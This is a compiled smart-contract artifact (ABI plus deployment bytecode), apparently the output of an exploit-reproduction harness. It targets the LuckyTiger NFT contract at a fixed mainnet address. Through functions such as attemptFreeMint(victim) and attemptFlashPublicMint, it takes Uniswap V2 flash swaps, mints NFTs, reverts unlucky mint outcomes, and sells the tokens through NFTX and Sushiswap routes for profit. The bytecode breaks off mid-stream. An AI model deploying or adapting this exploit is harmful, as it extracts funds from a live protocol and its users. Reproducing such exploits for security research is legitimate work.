{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"NFTX_FACTORY","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract INFTXVaultFactoryLike"}],"stateMutability":"view"},{"type":"function","name":"SUSHISWAP_FACTORY","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IUniswapV2FactoryLike"}],"stateMutability":"view"},{"type":"function","name":"TARGET","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract ILuckyTiger"}],"stateMutability":"view"},{"type":"function","name":"UNISWAP_V2_FACTORY","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IUniswapV2FactoryLike"}],"stateMutability":"view"},{"type":"function","name":"UNISWAP_V2_USDC_WETH","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IUniswapV2Pair"}],"stateMutability":"view"},{"type":"function","name":"WETH","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IWETH9"}],"stateMutability":"view"},{"type":"function","name":"attemptFlashPublicMint","inputs":[{"name":"expectedTokenId","type":"uint256","internalType":"uint256"},{"name":"mintPrice","type":"uint256","internalType":"uint256"},{"name":"nftxVault","type":"address","internalType":"address"},{"name":"salePair","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"attemptFreeMint","inputs":[{"name":"victim","type":"address","internalType":"address"},{"name":"expectedTokenId","type":"uint256","internalType":"uint256"},{"name":"nftxVault","type":"address","internalType":"address"},{"name":"salePair","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"discoveredVictim","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"hypothesisValidated","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"mintedTokenId","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"onERC721Received","inputs":[{"name":"","type":"address","internalType":"address"},{"name":"","type":"address","internalType":"address"},{"name":"","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[{"name":"","type":"bytes4","internalType":"bytes4"}],"stateMutability":"pure"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"pure"},{"type":"function","name":"rollbackObserved","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"uniswapV2Call","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"error","name":"FlashLoanNotRepaid","inputs":[]},{"type":"error","name":"MissingRollbackProof","inputs":[]},{"type":"error","name":"MissingSaleRoute","inputs":[{"name":"tokenId","type":"uint256","internalType":"uint256"}]},{"type":"error","name":"NotSelfCall","inputs":[]},{"type":"error","name":"TokenNotOwned","inputs":[{"name":"tokenId","type":"uint256","internalType":"uint256"}]},{"type":"error","name":"UnexpectedCallbackSender","inputs":[{"name":"sender","type":"address","internalType":"address"}]},{"type":"error","name":"UnexpectedPairCaller","inputs":[{"name":"caller","type":"address","internalType":"address"}]},{"type":"error","name":"UnexpectedSalePair","inputs":[{"name":"pair","type":"address","internalType":"address"}]},{"type":"error","name":"UnluckyOutcome","inputs":[{"name":"tokenId","type":"uint256","internalType":"uint256"}]}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b5061450e8061001c5f395ff3fe608060405260043610610101575f3560e01c80635ff972cc11610094578063ad5c464811610063578063ad5c4648146102fe578063c3719bb414610328578063cc1f2afa14610352578063e94a92ca1461037c578063fabae3eb146103a457610108565b80635ff972cc146102565780636fcd8b7d1461028057806372c60172146102aa57806399d8fae3146102d457610108565b8063463defd1116100d0578063463defd1146101ae57806349343624146101d8578063495c0f9b146102025780634f81cd041461022c57610108565b806310d1e85c1461010c578063150b7a02146101345780633c2448ed146101705780633c3ee3c91461018657610108565b3661010857005b5f5ffd5b348015610117575f5ffd5b50610132600480360381019061012d9190613a6c565b6103ce565b005b34801561013f575f5ffd5b5061015a60048036038101906101559190613af0565b610af7565b6040516101679190613bae565b60405180910390f35b34801561017b575f5ffd5b50610184610b0b565b005b348015610191575f5ffd5b506101ac60048036038101906101a79190613bc7565b611363565b005b3480156101b9575f5ffd5b506101c261155d565b6040516101cf9190613c45565b60405180910390f35b3480156101e3575f5ffd5b506101ec61156f565b6040516101f99190613c6d565b60405180910390f35b34801561020d575f5ffd5b5061021661158a565b6040516102239190613ce1565b60405180910390f35b348015610237575f5ffd5b506102406115a2565b60405161024d9190613d1a565b60405180910390f35b348015610261575f5ffd5b5061026a6115ba565b6040516102779190613d42565b60405180910390f35b34801561028b575f5ffd5b506102946115c3565b6040516102a19190613d7b565b60405180910390f35b3480156102b5575f5ffd5b506102be6115db565b6040516102cb9190613c6d565b60405180910390f35b3480156102df575f5ffd5b506102e86115ff565b6040516102f59190613ce1565b60405180910390f35b348015610309575f5ffd5b50610312611617565b60405161031f9190613db4565b60405180910390f35b348015610333575f5ffd5b5061033c61162f565b6040516103499190613c45565b60405180910390f35b34801561035d575f5ffd5b50610366611642565b6040516103739190613ded565b60405180910390f35b348015610387575f5ffd5b506103a2600480360381019061039d9190613e06565b61165a565b005b3480156103af575f5ffd5b506103b8611afb565b6040516103c59190613d42565b60405180910390f35b73b4e16d0168e52d35cacd2c6185b44281ec28c9dc73ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461045257336040517f85d6e2eb0000000000000000000000000000000000000000000000000000000081526004016104499190613c6d565b60405180910390fd5b3073ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff16146104c257846040517f675265af0000000000000000000000000000000000000000000000000000000081526004016104b99190613c6d565b60405180910390fd5b600360029054906101000a900460ff16610508576040517f7fc4d3b600000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b5f600454905073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d856040518263ffffffff1660e01b815260040161055b9190613d42565b5f604051808303815f87803b158015610572575f5ffd5b505af1158015610584573d5f5f3e3d5ffd5b50505050739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff166326092b836005546040518263ffffffff1660e01b81526004015f604051808303818588803b1580156105e4575f5ffd5b505af11580156105f6573d5f5f3e3d5ffd5b50505050503073ffffffffffffffffffffffffffffffffffffffff16739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff16636352211e836040518263ffffffff1660e01b815260040161065f9190613d42565b602060405180830381865afa15801561067a573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061069e9190613e7e565b73ffffffffffffffffffffffffffffffffffffffff16146106f657806040517fb6a1479e0000000000000000000000000000000000000000000000000000000081526004016106ed9190613d42565b60405180910390fd5b80600181905550739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff16632c88af5e826040518263ffffffff1660e01b815260040161074a9190613d42565b602060405180830381865afa158015610765573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107899190613ed3565b1561079b57610796611b01565b61091a565b5f73ffffffffffffffffffffffffffffffffffffffff1660065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16148061084257505f73ffffffffffffffffffffffffffffffffffffffff1660075f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16145b1561088457806040517fbab4d8cf00000000000000000000000000000000000000000000000000000000815260040161087b9190613d42565b60405180910390fd5b5f6108d28260065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660075f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16611b82565b90505f810361091857816040517fcee4e55c00000000000000000000000000000000000000000000000000000000815260040161090f9190613d42565b60405180910390fd5b505b5f61092485611f31565b90505f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016109749190613c6d565b602060405180830381865afa15801561098f573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906109b39190613f12565b9050818110156109fa57826040517fcee4e55c0000000000000000000000000000000000000000000000000000000081526004016109f19190613d42565b60405180910390fd5b73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff1663a9059cbb73b4e16d0168e52d35cacd2c6185b44281ec28c9dc846040518363ffffffff1660e01b8152600401610a5d929190613f3d565b6020604051808303815f875af1158015610a79573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610a9d9190613ed3565b610ad3576040517f7fc4d3b600000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b5f600360026101000a81548160ff0219169083151502179055505050505050505050565b5f63150b7a0260e01b905095945050505050565b739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff1663cd85cdb56040518163ffffffff1660e01b8152600401602060405180830381865afa158015610b68573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610b8c9190613ed3565b611361575f739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff166318160ddd6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610bee573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610c129190613f12565b9050739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff1663648e3c266040518163ffffffff1660e01b8152600401602060405180830381865afa158015610c71573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610c959190613f12565b8110610ca15750611361565b5f610caa611f60565b90505f5f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614610cee57610ce9826120c9565b610cf0565b5f5b90505f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401610d409190613c6d565b602060405180830381865afa158015610d5b573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610d7f9190613f12565b90505f610d8b856122e8565b9050805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614611063575f6001739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff166318160ddd6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610e5f573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610e839190613f12565b610e8d9190613f91565b90503073ffffffffffffffffffffffffffffffffffffffff1663e94a92ca838388886040518563ffffffff1660e01b8152600401610ece9493929190613fc4565b5f604051808303815f87803b158015610ee5575f5ffd5b505af1925050508015610ef6575060015b610f9a573d805f8114610f24576040519150601f19603f3d011682016040523d82523d5f602084013e610f29565b606091505b50610f3381612708565b15610f6257610f4283886127c3565b6001600360016101000a81548160ff021916908315150217905550610f94565b6040517fa3eee72400000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b50611061565b600160035f6101000a81548160ff0219169083151502179055508060018190555061105073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040161100b9190613c6d565b602060405180830381865afa158015611026573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061104a9190613f12565b84612942565b600281905550505050505050611361565b505b5f739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff166318160ddd6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156110c1573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906110e59190613f12565b90505f6001826110f59190613f91565b90503073ffffffffffffffffffffffffffffffffffffffff16633c3ee3c982739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff1663a035b1fe6040518163ffffffff1660e01b8152600401602060405180830381865afa158015611171573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906111959190613f12565b89896040518563ffffffff1660e01b81526004016111b69493929190614007565b5f604051808303815f87803b1580156111cd575f5ffd5b505af19250505080156111de575060015b61129d573d805f811461120c576040519150601f19603f3d011682016040523d82523d5f602084013e611211565b606091505b5061121b81612708565b1561126b5761122983612965565b6001600360016101000a81548160ff021916908315150217905550600160035f6101000a81548160ff0219169083151502179055505050505050505050611361565b6040517fa3eee72400000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b600160035f6101000a81548160ff0219169083151502179055508060018190555061135373c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040161130e9190613c6d565b602060405180830381865afa158015611329573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061134d9190613f12565b85612942565b600281905550505050505050505b565b3073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146113c8576040517fec7cdc0a00000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b6001600360026101000a81548160ff02191690831515021790555083600481905550826005819055508160065f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508060075f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073b4e16d0168e52d35cacd2c6185b44281ec28c9dc73ffffffffffffffffffffffffffffffffffffffff1663022c0d9f5f8530886040516020016114b59190613d42565b6040516020818303038152906040526040518563ffffffff1660e01b81526004016114e394939291906140f3565b5f604051808303815f87803b1580156114fa575f5ffd5b505af115801561150c573d5f5f3e3d5ffd5b50505050600360029054906101000a900460ff1615611557576040517f7fc4d3b600000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b50505050565b60035f9054906101000a900460ff1681565b5f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2905090565b73c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac81565b73be86f647b167567525ccaafcd6f881f1ee55821681565b5f600254905090565b73b4e16d0168e52d35cacd2c6185b44281ec28c9dc81565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f81565b73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc281565b600360019054906101000a900460ff1681565b739c87a5726e98f2f404cdd8ac8968e9b2c80c096781565b3073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146116bf576040517fec7cdc0a00000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b5f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040161170d9190613c6d565b602060405180830381865afa158015611728573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061174c9190613f12565b9050739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff1663fa07ce1d866040518263ffffffff1660e01b815260040161179b9190613c6d565b5f604051808303815f87803b1580156117b2575f5ffd5b505af11580156117c4573d5f5f3e3d5ffd5b505050503073ffffffffffffffffffffffffffffffffffffffff16739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff16636352211e866040518263ffffffff1660e01b815260040161182c9190613d42565b602060405180830381865afa158015611847573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061186b9190613e7e565b73ffffffffffffffffffffffffffffffffffffffff16146118c357836040517fb6a1479e0000000000000000000000000000000000000000000000000000000081526004016118ba9190613d42565b60405180910390fd5b739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff16632c88af5e856040518263ffffffff1660e01b81526004016119109190613d42565b602060405180830381865afa15801561192b573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061194f9190613ed3565b156119625761195c611b01565b50611af5565b5f73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614806119c757505f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16145b15611a0957836040517fbab4d8cf000000000000000000000000000000000000000000000000000000008152600401611a009190613d42565b60405180910390fd5b5f611a15858585611b82565b90505f811480611ab057508173c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401611a6e9190613c6d565b602060405180830381865afa158015611a89573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611aad9190613f12565b11155b15611af257846040517fcee4e55c000000000000000000000000000000000000000000000000000000008152600401611ae99190613d42565b60405180910390fd5b50505b50505050565b60015481565b5f4790505f811115611b7f5773c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff1663d0e30db0826040518263ffffffff1660e01b81526004015f604051808303818588803b158015611b67575f5ffd5b505af1158015611b79573d5f5f3e3d5ffd5b50505050505b50565b5f739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff1663095ea7b384866040518363ffffffff1660e01b8152600401611bd2929190613f3d565b5f604051808303815f87803b158015611be9575f5ffd5b505af1158015611bfb573d5f5f3e3d5ffd5b505050505f600167ffffffffffffffff811115611c1b57611c1a61413d565b5b604051908082528060200260200182016040528015611c495781602001602082028036833780820191505090505b50905084815f81518110611c6057611c5f61416a565b5b6020026020010181815250505f600167ffffffffffffffff811115611c8857611c8761413d565b5b604051908082528060200260200182016040528015611cb65781602001602082028036833780820191505090505b5090506001815f81518110611cce57611ccd61416a565b5b6020026020010181815250505f8573ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401611d149190613c6d565b602060405180830381865afa158015611d2f573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611d539190613f12565b90508573ffffffffffffffffffffffffffffffffffffffff16633d5d190c84846040518363ffffffff1660e01b8152600401611d9092919061424e565b6020604051808303815f875af1925050508015611dcb57506040513d601f19601f82011682018060405250810190611dc89190613f12565b60015b611e0c57866040517fcee4e55c000000000000000000000000000000000000000000000000000000008152600401611e039190613d42565b60405180910390fd5b505f611e8f8773ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401611e4a9190613c6d565b602060405180830381865afa158015611e65573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611e899190613f12565b83612942565b90505f8103611ed557876040517fcee4e55c000000000000000000000000000000000000000000000000000000008152600401611ecc9190613d42565b60405180910390fd5b611ee0878783612a21565b94505f8503611f2657876040517fcee4e55c000000000000000000000000000000000000000000000000000000008152600401611f1d9190613d42565b60405180910390fd5b505050509392505050565b5f60016103e56103e884611f459190614283565b611f4f91906142f1565b611f599190613f91565b9050919050565b5f5f73be86f647b167567525ccaafcd6f881f1ee55821673ffffffffffffffffffffffffffffffffffffffff1663264a62086040518163ffffffff1660e01b8152600401602060405180830381865afa925050508015611fde57506040513d601f19601f82011682018060405250810190611fdb9190613f12565b60015b611feb575f9150506120c6565b809150505f600190505b81811161205a575f61200682613036565b90505f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614612046578093505050506120c6565b50808061205290614321565b915050611ff5565b505f5f90505b818110156120c0575f61207282613036565b90505f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16146120b2578093505050506120c6565b508080600101915050612060565b505f9150505b90565b5f5f61217673c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac73ffffffffffffffffffffffffffffffffffffffff1663e6a439058573c02aaa39b223fe8d0a0e5c4f27ead9083c756cc26040518363ffffffff1660e01b8152600401612131929190614368565b602060405180830381865afa15801561214c573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906121709190613e7e565b846131d6565b90505f612224735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f73ffffffffffffffffffffffffffffffffffffffff1663e6a439058673c02aaa39b223fe8d0a0e5c4f27ead9083c756cc26040518363ffffffff1660e01b81526004016121df929190614368565b602060405180830381865afa1580156121fa573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061221e9190613e7e565b856131d6565b90505f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036122635780925050506122e3565b5f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036122a05781925050506122e3565b5f6122b48386670de0b6b3a76400006134e4565b90505f6122ca8387670de0b6b3a76400006134e4565b9050808210156122da57826122dc565b835b9450505050505b919050565b5f5f6040518060800160405280739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff16638da5cb5b6040518163ffffffff1660e01b8152600401602060405180830381865afa158015612352573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906123769190613e7e565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff16631581b6006040518163ffffffff1660e01b8152600401602060405180830381865afa158015612404573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906124289190613e7e565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020013073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681525090505f5f90505b6004811015612532576124ff8282600481106124f5576124f461416a565b5b60200201516137b2565b15612525578181600481106125175761251661416a565b5b602002015192505050612703565b80806001019150506124d6565b505f8367ffffffffffffffff81111561254e5761254d61413d565b5b60405190808252806020026020018201604052801561257c5781602001602082028036833780820191505090505b5090505f5f600190505b8581116126fb575f739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff16636352211e836040518263ffffffff1660e01b81526004016125db9190613d42565b602060405180830381865afa92505050801561261557506040513d601f19601f820116820180604052508101906126129190613e7e565b60015b61261f57506126e8565b809150505f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161480612664575061266384848361387e565b5b1561266f57506126e8565b808484815181106126835761268261416a565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff168152505082806126c890614321565b9350506126d4816137b2565b156126e6578095505050505050612703565b505b80806126f390614321565b915050612586565b505f93505050505b919050565b5f60048251101561271b575f90506127be565b5f6020830151905063cee4e55c60e01b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916817bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191614806127ba575063bab4d8cf60e01b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916817bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916145b9150505b919050565b80739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff166318160ddd6040518163ffffffff1660e01b8152600401602060405180830381865afa158015612821573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906128459190613f12565b1461287c576040517fa3eee72400000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff1663f99031a7836040518263ffffffff1660e01b81526004016128c99190613c6d565b602060405180830381865afa1580156128e4573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906129089190613ed3565b61293e576040517fa3eee72400000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b5050565b5f818311612950575f61295d565b818361295c919061438f565b5b905092915050565b80739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff166318160ddd6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156129c3573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906129e79190613f12565b14612a1e576040517fa3eee72400000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b50565b5f5f5f8473ffffffffffffffffffffffffffffffffffffffff16630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015612a6d573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190612a91919061443e565b50915091505f8573ffffffffffffffffffffffffffffffffffffffff16630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa158015612ae0573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190612b049190613e7e565b90505f8673ffffffffffffffffffffffffffffffffffffffff1663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa158015612b50573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190612b749190613e7e565b90508773ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16148015612bf0575073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16145b15612db457612c2086856dffffffffffffffffffffffffffff16856dffffffffffffffffffffffffffff166138fc565b94505f8503612c35575f94505050505061302f565b8773ffffffffffffffffffffffffffffffffffffffff1663a9059cbb88886040518363ffffffff1660e01b8152600401612c70929190613f3d565b6020604051808303815f875af1158015612c8c573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190612cb09190613ed3565b612cf3576001546040517fcee4e55c000000000000000000000000000000000000000000000000000000008152600401612cea9190613d42565b60405180910390fd5b8673ffffffffffffffffffffffffffffffffffffffff1663022c0d9f5f87305f67ffffffffffffffff811115612d2c57612d2b61413d565b5b6040519080825280601f01601f191660200182016040528015612d5e5781602001600182028036833780820191505090505b506040518563ffffffff1660e01b8152600401612d7e94939291906140f3565b5f604051808303815f87803b158015612d95575f5ffd5b505af1158015612da7573d5f5f3e3d5ffd5b505050505050505061302f565b8773ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16148015612e2e575073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16145b15612ff257612e5e86846dffffffffffffffffffffffffffff16866dffffffffffffffffffffffffffff166138fc565b94505f8503612e73575f94505050505061302f565b8773ffffffffffffffffffffffffffffffffffffffff1663a9059cbb88886040518363ffffffff1660e01b8152600401612eae929190613f3d565b6020604051808303815f875af1158015612eca573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190612eee9190613ed3565b612f31576001546040517fcee4e55c000000000000000000000000000000000000000000000000000000008152600401612f289190613d42565b60405180910390fd5b8673ffffffffffffffffffffffffffffffffffffffff1663022c0d9f865f305f67ffffffffffffffff811115612f6a57612f6961413d565b5b6040519080825280601f01601f191660200182016040528015612f9c5781602001600182028036833780820191505090505b506040518563ffffffff1660e01b8152600401612fbc949392919061448e565b5f604051808303815f87803b158015612fd3575f5ffd5b505af1158015612fe5573d5f5f3e3d5ffd5b505050505050505061302f565b866040517f030985c40000000000000000000000000000000000000000000000000000000081526004016130269190613c6d565b60405180910390fd5b9392505050565b5f5f73be86f647b167567525ccaafcd6f881f1ee55821673ffffffffffffffffffffffffffffffffffffffff166381a36fb6846040518263ffffffff1660e01b81526004016130859190613d42565b602060405180830381865afa9250505080156130bf57506040513d601f19601f820116820180604052508101906130bc9190613e7e565b60015b6130cc575f9150506131d1565b809150505f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff160361310c575f9150506131d1565b8073ffffffffffffffffffffffffffffffffffffffff16631ba46cfd6040518163ffffffff1660e01b8152600401602060405180830381865afa92505050801561317457506040513d601f19601f820116820180604052508101906131719190613e7e565b60015b156131cc57739c87a5726e98f2f404cdd8ac8968e9b2c80c096773ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036131ca5781925050506131d1565b505b5f9150505b919050565b5f5f73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603613212575f90506134de565b5f5f5f5f8673ffffffffffffffffffffffffffffffffffffffff16630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa92505050801561327e57506040513d601f19601f8201168201806040525081019061327b9190613e7e565b60015b61328e575f9450505050506134de565b809450508673ffffffffffffffffffffffffffffffffffffffff1663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa9250505080156132fa57506040513d601f19601f820116820180604052508101906132f79190613e7e565b60015b61330a575f9450505050506134de565b809350508673ffffffffffffffffffffffffffffffffffffffff16630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa92505050801561337657506040513d601f19601f82011682018060405250810190613373919061443e565b60015b613386575f9450505050506134de565b8294508193505050505f8673ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff1614801561340a575073c02aaa39b223fe8d0a0e5c4f27ead908